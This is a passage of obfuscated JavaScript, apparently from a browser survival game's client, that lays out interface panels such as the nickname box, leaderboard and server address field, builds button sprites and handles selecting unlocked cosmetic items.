				13 == event.keyCode && !ᐃᐃᐃ.waiting && !ᐃᐃᐃ.ᐃᐃⵠⲆⵠⵠᐃⵠΔ && ᐃᐃᐃ.ⲆᐃΔᐃⵠΔⵠ()
			}));
			this.ⵠΔⵠⲆᐃ.input.value = ΔΔᐃᐃ.get("starve_nickname") ? ΔΔᐃᐃ.get("starve_nickname") : "";
			this.ᐃⲆΔⲆⵠⵠᐃⲆᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("account_nickname_block"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("account_nickname_block").style,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]),
				active: ⲆᐃⲆⲆ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: Ⲇⵠᐃⵠᐃ,
				translate: {
					"ᐃᐃΔⵠⵠ": 110,
					"ᐃΔⵠᐃᐃ": -122,
					y: ΔⲆⵠⲆ,
					x: ⲆⲆⲆᐃ
				}
			};
			if (1300 > ᐃⲆᐃΔᐃⵠᐃ.innerWidth) this.ΔΔⲆΔⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]).style,
				active: ⵠⵠᐃΔ,
				position: ⲆΔⵠⲆ | ΔⲆᐃⵠ,
				view: ⲆⵠΔΔΔ,
				translate: {
					x: 0,
					"ᐃᐃΔⵠⵠ": 225,
					"ᐃΔⵠᐃᐃ": 208,
					y: 0
				}
			};
			else this.ΔΔⲆΔⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[96]).style,
				active: ⵠⵠᐃΔ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: ⲆⵠΔΔΔ,
				translate: {
					"ᐃᐃΔⵠⵠ": 225,
					x: Δᐃᐃⵠ,
					"ᐃΔⵠᐃᐃ": -180,
					y: 0
				}
			};
			this.ⲆⲆⵠΔᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("leaderboard"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("leaderboard").style,
				active: ⲆᐃⲆⲆ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: ᐃⲆⵠⲆⲆ,
				translate: {
					x: ΔΔⵠⵠ,
					"ᐃᐃΔⵠⵠ": 190,
					y: ⲆΔⵠ,
					"ᐃΔⵠᐃᐃ": -294.5
				}
			};
			this.ᐃΔⲆΔⵠⵠⵠⲆᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box").style,
				active: ⲆᐃⲆⲆ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: Ⲇⵠᐃⵠᐃ,
				translate: {
					x: 0,
					"ᐃΔⵠᐃᐃ": 125,
					"ᐃᐃΔⵠⵠ": 187,
					y: 0
				}
			};
			this.ΔΔⲆⵠᐃⲆⵠΔΔ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("serverAddressBlock"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("serverAddressBlock").style,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[378]),
				active: ⲆᐃⲆⲆ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: ⵠᐃⲆⵠⵠ,
				translate: {
					x: 0,
					y: 0,
					"ᐃᐃΔⵠⵠ": 350,
					"ᐃΔⵠᐃᐃ": -260
				}
			};
			ᐃⲆ = ΔΔⵠ;
			this.ᐃΔⵠΔΔ = [];
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ⵠΔⵠⲆᐃ;
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ΔΔⲆΔⲆ;
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ⲆⲆⵠΔᐃ;
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ᐃⲆΔⲆⵠⵠᐃⲆᐃ;
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ᐃΔⲆΔⵠⵠⵠⲆᐃ;
			this.ᐃΔⵠΔΔ[ᐃⲆ++] = this.ΔΔⲆⵠᐃⲆⵠΔΔ;
			ᐃⲆ = ⵠΔⲆⵠ;
			this.ⵠⵠⲆᐃ = [];
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃΔⵠΔⲆⲆᐃ, ⵠⵠᐃΔ, ᐃⵠΔ, ⲆⲆⲆᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⲆⲆΔⵠⵠᐃⵠ, ⲆᐃⲆⲆ, 0, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ΔᐃΔΔⲆⵠᐃ, ⲆᐃⲆⲆ, 0, ⲆⲆⲆᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ΔΔⵠⵠⲆⵠᐃ, ⲆᐃⲆⲆ, ⵠⲆᐃⵠ, ΔΔⵠⵠ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⲆΔᐃΔⲆᐃΔ, ⲆᐃⲆⲆ, ΔΔⵠⵠ, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⲆΔⲆΔⵠᐃⲆ, ⲆᐃⲆⲆ, 0, Δᐃᐃⵠ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⵠⵠⲆΔΔⲆΔ, ⲆᐃⲆⲆ, Δᐃᐃⵠ, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃⲆⵠᐃΔᐃ, ⲆᐃⲆⲆ, 0, ΔⲆⲆ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃⵠΔᐃⲆⵠ, ⲆᐃⲆⲆ, ΔΔⵠⵠ, ᐃⵠΔ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⲆΔⵠΔᐃⲆᐃ, ⲆᐃⲆⲆ, 0, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ΔΔΔⲆᐃΔⵠ, ⲆᐃⲆⲆ, 0, Δᐃᐃᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃΔᐃΔᐃᐃ, ⲆᐃⲆⲆ, 0, Δᐃᐃᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃⵠΔⵠΔⵠⲆ, ⲆᐃⲆⲆ, 0, ⵠⲆᐃⵠ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃⲆⵠΔΔⵠ, ⲆᐃⲆⲆ, ᐃⵠΔ, ⵠᐃⲆᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ΔⲆⵠΔΔⵠⲆ, ⲆᐃⲆⲆ, 0, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⵠΔⵠⲆⵠᐃⵠ, ⲆᐃⲆⲆ, ⲆⲆⲆᐃ, ΔⲆⲆ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ΔⲆΔⵠⵠᐃⲆ, ⲆᐃⲆⲆ, 0, 0, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃⲆⲆⵠⵠⵠᐃ, ⲆᐃⲆⲆ, 0, Δᐃᐃᐃ, ΔⲆᐃⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ᐃΔⲆᐃᐃΔⵠ, ⲆᐃⲆⲆ, ΔΔⵠ, ᐃⵠⲆⵠ, ΔⲆᐃⵠ);
			ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⲆᐃⵠᐃⲆᐃⲆ, ⵠⵠᐃΔ, 200, 100, ⲆΔⵠⲆ | ΔⲆᐃⵠ) : this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⲆᐃⵠᐃⲆᐃⲆ, ⵠⵠᐃΔ, -753 / ⵠⵠΔᐃΔ, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆⵠΔΔΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ++] = ΔΔⲆⲆ(ⲆΔ.ⵠΔΔⲆᐃΔⲆ, ⵠⵠᐃΔ, 403, -10, ΔⵠⲆⵠⲆ);
			ᐃⲆᐃΔᐃⵠᐃ.innerWidth > 1300 && (this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⲆᐃᐃᐃⵠⲆ, ⵠⵠᐃΔ, -885 / 4, -319 / 2, ⵠⵠΔⵠᐃⵠⵠ | ΔⲆⲆⵠ), this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆⵠΔΔΔ);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔⲆΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -1293 / 4, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠᐃᐃⵠⵠⵠᐃ, ⲆᐃⲆⲆ, -1425 / 4, ⲆᐃᐃΔⵠᐃΔ, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠΔᐃΔⵠⵠⲆ, ⲆᐃⲆⲆ, -905 / ⵠⲆⵠᐃ, 50, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃᐃΔᐃⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔᐃΔᐃⵠᐃⵠ, ⲆᐃⲆⲆ, -1608 / ΔⲆᐃⵠᐃ, 130, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⲆⵠⲆⲆᐃⵠᐃ, ⲆᐃⲆⲆ, -1117 / ΔᐃⵠⵠⲆ, 130, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⵠⲆⵠⲆᐃⵠ, ⲆᐃⲆⲆ, -1222 / ⲆⵠᐃⲆ, 130, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⲆⲆⲆᐃⵠΔ, ⲆᐃⲆⲆ, -1222 / ⲆⵠᐃⲆ, ⲆᐃⵠΔΔⲆⲆ, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠᐃⲆⵠⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔⲆⵠⲆⲆⲆΔ, ⲆᐃⲆⲆ, -ⲆΔ.ΔⲆⵠⲆⲆⲆΔ.width / 4 - 350, -15, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃΔᐃᐃⵠⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⵠⵠᐃΔΔⲆ, ⲆᐃⲆⲆ, -1497 / ⵠΔΔᐃΔ, 110, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃᐃᐃⲆᐃᐃⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⲆΔᐃΔΔᐃ, ⲆᐃⲆⲆ, -1226 / ⲆⵠᐃΔ, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃΔΔⵠᐃⵠᐃ, ⲆᐃⲆⲆ, -1381 / 4, 80, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃⲆᐃⲆᐃΔΔ, ⲆᐃⲆⲆ, -1542 / ⲆⵠΔⵠ, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃⲆᐃΔᐃⵠ;
			var ᐃᐃᐃᐃⵠ = 360 / ᐃᐃᐃⵠⵠⲆⵠ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				[ⵠ[177], ᐃᐃᐃᐃⵠ * 3],
				[ⵠ[352], ᐃᐃᐃᐃⵠ * ⲆⲆΔΔⲆⲆⵠ],
				[ⵠ[117], ᐃᐃᐃᐃⵠ * 30],
				["#d88e23", 57 * ᐃᐃᐃᐃⵠ]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / 4, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃⲆᐃΔᐃⵠ;
			this.ΔⲆᐃⲆⵠᐃΔᐃⵠ = function(ᐃΔᐃᐃΔⲆⵠΔᐃ, ᐃᐃⵠⵠ, ⲆᐃΔⲆⵠⵠⲆ) {
				ᐃᐃᐃ.ⵠΔΔΔⵠ = ΔΔΔ;
				ᐃᐃᐃ.ᐃΔᐃᐃⲆⲆⲆ = 0;
				ᐃᐃᐃ.ᐃΔⵠⲆⵠΔⵠ = ᐃⵠⲆⵠ;
				ᐃᐃᐃ.ᐃⵠᐃⵠΔⵠⵠ = ᐃΔᐃᐃΔⲆⵠΔᐃ;
				ᐃᐃᐃ.ⵠⲆΔⵠⵠⵠⲆ = ᐃᐃⵠⵠ;
				var Ⲇⵠᐃ;
				var ⵠᐃ = 0;
				if (ᐃᐃⵠⵠ === 0) {
					for (ⵠᐃ = ᐃⵠΔ; ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ.length > ⵠᐃ; ⵠᐃ++) {
						if (ⲆᐃΔⲆⵠⵠⲆ === ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ].id) break
					}
					Ⲇⵠᐃ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ];
					ᐃᐃᐃ.unlock.ⲆⵠⲆᐃ[ⵠᐃ] = 1
				} else if (1 === ᐃᐃⵠⵠ) {
					for (ⵠᐃ = Ⲇᐃⵠⵠ; ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ.length > ⵠᐃ; ⵠᐃ++) {
						if (ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ[ⵠᐃ].id === ⲆᐃΔⲆⵠⵠⲆ) break
					}
					Ⲇⵠᐃ = ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ[ⵠᐃ];
					ᐃᐃᐃ.unlock.Δᐃᐃⵠᐃ[ⵠᐃ] = 1
				} else if (ᐃᐃⵠⵠ === ⵠΔᐃᐃⵠ) {
					for (ⵠᐃ = 0; ᐃⲆⵠⲆ.ⵠᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
						if (ⲆᐃΔⲆⵠⵠⲆ === ᐃⲆⵠⲆ.ⵠᐃᐃⵠ[ⵠᐃ].id) break
					}
					Ⲇⵠᐃ = ᐃⲆⵠⲆ.ⵠᐃᐃⵠ[ⵠᐃ];
					ᐃᐃᐃ.unlock.ΔⵠΔᐃⲆ[ⵠᐃ] = 1
				} else if (ᐃᐃⵠⵠ === ᐃᐃⲆⲆ) {
					for (ⵠᐃ = 0; ⵠᐃ < ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ.length; ⵠᐃ++) {
						if (ⲆᐃΔⲆⵠⵠⲆ === ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ[ⵠᐃ].id) break
					}
					Ⲇⵠᐃ = ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ[ⵠᐃ];
					ᐃᐃᐃ.unlock.ⵠⲆᐃⵠⵠ[ⵠᐃ] = ᐃⲆᐃ
				} else if (ᐃᐃⵠⵠ === ⵠᐃᐃⲆ) {
					for (ⵠᐃ = Δᐃᐃᐃ; ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ.length > ⵠᐃ; ⵠᐃ++) {
						if (ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ[ⵠᐃ].id === ⲆᐃΔⲆⵠⵠⲆ) break
					}
					Ⲇⵠᐃ = ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ[ⵠᐃ];
					ᐃᐃᐃ.unlock.ⲆᐃⲆⲆᐃ[ⵠᐃ] = 1;
					ᐃᐃᐃ.unlock.ᐃⲆⵠΔⵠ[ⵠᐃ] = ᐃⲆᐃ
				}
				ᐃᐃᐃ.Δᐃⵠⵠⵠⵠⵠ = ⵠᐃ;
				ᐃᐃᐃ.ⲆΔᐃⲆΔᐃⲆ = ᐃⲆⲆⲆⲆ("by " + Ⲇⵠᐃ.ᐃΔⵠ, ⵠ[55], ⵠ[354], 40, 500, undefined, 30, 24, ᐃⵠᐃⵠᐃ, undefined, ⲆΔⵠⲆⲆ, ⵠⵠᐃᐃᐃ, ⵠ[339], 24);
				ᐃᐃᐃ.ⲆⵠᐃΔᐃᐃⲆ = ᐃⲆⲆⲆⲆ(Ⲇⵠᐃ.name, ⵠ[55], ⵠ[354], 60, 600, undefined, 30, 24, ᐃᐃⵠᐃᐃ, ΔΔⵠᐃΔ, undefined, ⲆⵠᐃⲆⲆ, ⵠ[339], ⲆΔⲆⲆΔ)
			};
			this.ⵠΔΔΔⵠ = 0;
			this.ᐃΔᐃᐃⲆⲆⲆ = 0;
			this.ᐃⵠᐃⵠΔⵠⵠ = 0;
			this.ⵠⲆΔⵠⵠⵠⲆ = Δⵠᐃ;
			this.ᐃΔⵠⲆⵠΔⵠ = Ⲇᐃᐃᐃ;
			this.ⲆΔᐃⲆΔᐃⲆ = undefined;
			this.ⲆⵠᐃΔᐃᐃⲆ = ⲆⲆⲆⲆᐃ;
			var ΔᐃⲆΔᐃⲆΔⵠᐃ = 150 + 448 / ᐃⲆᐃⲆⵠ - 260 / ⲆⵠΔⵠ;
			var ᐃᐃⲆⲆᐃⲆᐃΔⵠ = -260 / ⲆΔⵠᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠΔΔⲆΔⲆⲆ, ⲆᐃⲆⲆ, -1542 / 4, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔⲆΔⲆᐃᐃᐃ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				[ⵠ[479], ᐃᐃᐃᐃⵠ * ΔΔᐃΔ],
				[ⵠ[177], ᐃᐃᐃᐃⵠ * 10],
				[ⵠ[352], ᐃᐃᐃᐃⵠ * 30],
				[ⵠ[117], 57 * ᐃᐃᐃᐃⵠ]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / ΔᐃⵠⵠⲆ, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔⲆΔⲆᐃᐃᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⵠᐃᐃⲆᐃΔ, ⲆᐃⲆⲆ, -1542 / 4, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⵠⵠⲆΔΔΔ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				["#d33a2a", 3 * ᐃᐃᐃᐃⵠ],
				[ⵠ[479], 10 * ᐃᐃᐃᐃⵠ],
				[ⵠ[177], 30 * ᐃᐃᐃᐃⵠ],
				[ⵠ[352], 57 * ᐃᐃᐃᐃⵠ]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / 4, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⵠⵠⲆΔΔΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃⵠᐃⲆᐃΔΔ, ⲆᐃⲆⲆ, -1542 / 4, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃΔΔⲆⲆΔ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				[ⵠ[177], ᐃᐃᐃᐃⵠ * ΔΔᐃΔ],
				[ⵠ[352], ᐃᐃᐃᐃⵠ * ⲆⲆΔΔⲆⲆⵠ],
				[ⵠ[117], ᐃᐃᐃᐃⵠ * 30],
				["#d88e23", ᐃᐃᐃᐃⵠ * 57]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / ⲆⵠΔⵠ, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ΔᐃΔΔⲆⲆΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠⲆΔΔΔⵠΔ, ⲆᐃⲆⲆ, -1542 / ⲆᐃᐃΔ, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠΔΔⵠⵠⵠᐃ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				[ⵠ[479], ᐃᐃᐃᐃⵠ * ⲆΔⵠⵠ],
				[ⵠ[177], ᐃᐃᐃᐃⵠ * ΔⲆⵠⲆⲆ],
				[ⵠ[352], ᐃᐃᐃᐃⵠ * 30],
				[ⵠ[117], 57 * ᐃᐃᐃᐃⵠ]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / 4, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠΔΔⵠⵠⵠᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠΔᐃⵠᐃⵠᐃ, ⲆᐃⲆⲆ, -1542 / ⵠⵠΔᐃΔ, 150, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃΔⵠⵠⲆΔᐃ;
			var ΔΔⲆⲆⲆ = this.ⲆΔᐃⵠⲆᐃⵠ([
				["#d33a2a", ΔΔⵠΔ * ᐃᐃᐃᐃⵠ],
				[ⵠ[479], ΔᐃⲆⲆⵠ * ᐃᐃᐃᐃⵠ],
				[ⵠ[177], 30 * ᐃᐃᐃᐃⵠ],
				[ⵠ[352], ᐃᐃᐃᐃⵠ * 57]
			]);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ΔΔⲆⲆⲆ, ⲆᐃⲆⲆ, -ΔΔⲆⲆⲆ.width / ΔⲆⲆⲆ, 178, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃΔⵠⵠⲆΔᐃ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃΔᐃⵠⵠⲆ, ⲆᐃⲆⲆ, -1366 / 4, ⵠⵠΔᐃᐃ, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.Δⵠᐃⵠⵠᐃᐃ, ⲆᐃⲆⲆ, -1366 / Ⲇⵠⵠⵠ, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠᐃᐃⲆᐃⲆᐃ, ⲆᐃⲆⲆ, -1366 / ⲆⵠᐃΔ, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃⵠᐃᐃΔⲆΔ, ⲆᐃⲆⲆ, -1366 / 4, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃⵠΔᐃΔᐃΔ, ⲆᐃⲆⲆ, -1366 / 4, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔΔⵠᐃᐃΔⵠ, ⲆᐃⲆⲆ, -1366 / 4, 100, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			ΔⵠᐃⵠΔⵠⲆ = ᐃⲆ++;
			this.ⵠⵠⲆᐃ[ΔⵠᐃⵠΔⵠⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔⵠᐃⵠΔⵠⲆ, ⲆᐃⲆⲆ, 908 / ⲆⵠΔΔ + 30, ΔΔⵠⵠ, ⲆΔⵠⲆ);
			ⲆᐃΔᐃⲆⲆΔ = ᐃⲆ++;
			this.ⵠⵠⲆᐃ[ⲆᐃΔᐃⲆⲆΔ] = ΔΔⲆⲆ(ⲆΔ.ⲆᐃΔᐃⲆⲆΔ, ⲆᐃⲆⲆ, 752.5 + 60, ᐃⵠⲆ, ⲆΔⵠⲆ);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃⵠᐃᐃⲆⵠⵠ, ⲆᐃⲆⲆ, -758 / ⵠΔΔᐃΔ, -5, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠⵠᐃᐃⵠᐃⵠ;
